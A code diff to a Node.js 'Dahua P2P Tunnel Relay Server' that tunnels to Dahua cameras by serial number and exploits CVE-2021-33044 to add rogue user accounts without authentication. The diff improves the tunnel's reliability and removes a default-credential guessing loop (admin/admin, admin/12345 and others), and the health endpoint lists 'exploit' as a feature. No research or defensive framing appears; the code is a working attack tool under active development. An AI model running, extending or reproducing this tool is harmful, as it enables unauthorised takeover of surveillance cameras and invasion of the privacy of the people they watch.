@@ -1,7 +1,9 @@
 #!/usr/bin/env node
 /**
- * Dahua P2P Tunnel Relay Server v3.8
+ * Dahua P2P Tunnel Relay Server v3.9
  * ===================================
+ * v3.9: FIXED agent PTCP handshake timeout — clear mainSock queue before handshake;
+ *   removed default credential fallback (CVE bypass needs no credentials).
  * v3.8: FIXED PTCP "Invalid magic" error — readPTCP now skips non-PTCP packets
  *   (STUN/NAT residue); clears msgQueue before device PTCP handshake;
  *   try/catch in NAT traversal loop so timeout doesn't kill the tunnel.
@@ -437,16 +439,19 @@ async function establishTunnel(serial, username, password, targetPort) {
     var relayChannelBody = '<body><Identify>' + relayAuth + '</Identify><PubAddr>' + agentServer + ':' + agentPort + '</PubAddr></body>\r\n';
     await mainSock.request('/device/' + serial + '/relay-channel', relayChannelBody, false);
 
+    // Clear stale messages from relay/agent communication before PTCP handshake
+    mainSock._msgQueue = [];
     mainSock.setRemote(agentServer, agentPort);
-    await mainSock.recv(5000);
+    try { await mainSock.recv(3000); } catch(e) {}
+    mainSock._msgQueue = [];
 
     // PTCP handshake with agent
     await mainSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
-    await mainSock.readPTCP();
+    await mainSock.readPTCP(8000);
 
     await mainSock.requestPTCP(Buffer.concat([Buffer.from([0x17, 0x00, 0x00, 0x00]), Buffer.alloc(8)]));
-    var ptcpRes = await mainSock.readPTCP();
-    while (ptcpRes.body.length === 0) ptcpRes = await mainSock.readPTCP();
+    var ptcpRes = await mainSock.readPTCP(8000);
+    while (ptcpRes.body.length === 0) ptcpRes = await mainSock.readPTCP(8000);
     var sign = ptcpRes.body.subarray(12);
 
     await mainSock.requestPTCP();
@@ -635,18 +640,8 @@ async function exploitAddUser(serial, newUser, newPass, targetPort) {
     tunnel = await establishTunnel(serial, null, null, targetPort);
     allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (sin auth)' });
   } catch (err) {
-    allSteps.push({ step: 'tunnel_detail', message: 'Sin auth: ' + err.message + ' — reintentando con creds...' });
-    var creds = [{u:'admin',p:'admin'},{u:'admin',p:'12345'},{u:'admin',p:'888888'},{u:'admin',p:''},{u:'admin',p:'password'}];
-    var ok = false;
-    for (var tc = 0; tc < creds.length; tc++) {
-      try {
-        tunnel = await establishTunnel(serial, creds[tc].u, creds[tc].p, targetPort);
-        ok = true;
-        allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel OK con: ' + creds[tc].u + '/' + (creds[tc].p || '(empty)') });
-        break;
-      } catch (e) { allSteps.push({ step: 'tunnel_detail', message: creds[tc].u + '/' + (creds[tc].p||'(empty)') + ': ' + e.message }); }
-    }
-    if (!ok) { allSteps.push({ step: 'tunnel', status: 'failed', message: 'Todas las creds fallaron' }); return { success: false, steps: allSteps }; }
+    allSteps.push({ step: 'tunnel', status: 'failed', message: 'Tunel PTCP fallo: ' + err.message });
+    return { success: false, steps: allSteps };
   }
   try {
     allSteps.push({ step: 'exploit', status: 'running', message: 'CVE-2021-33044 (NetKeyboard)...' });
@@ -726,7 +721,7 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '3.8', features: ['status','tunnel','cgi','debug','exploit'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '3.9', features: ['status','tunnel','cgi','debug','exploit'] }));
   }
 
   if (req.url.startsWith('/debug/') && req.method === 'GET') {
@@ -833,5 +828,5 @@ process.on('uncaughtException', function(e) { console.error('[FATAL]', e.message
 process.on('unhandledRejection', function(e) { console.error('[FATAL]', e); });
 
 server.listen(PORT, function() {
-  console.log('Dahua P2P Tunnel Relay v3.8 running on port ' + PORT);
+  console.log('Dahua P2P Tunnel Relay v3.9 running on port ' + PORT);
 });
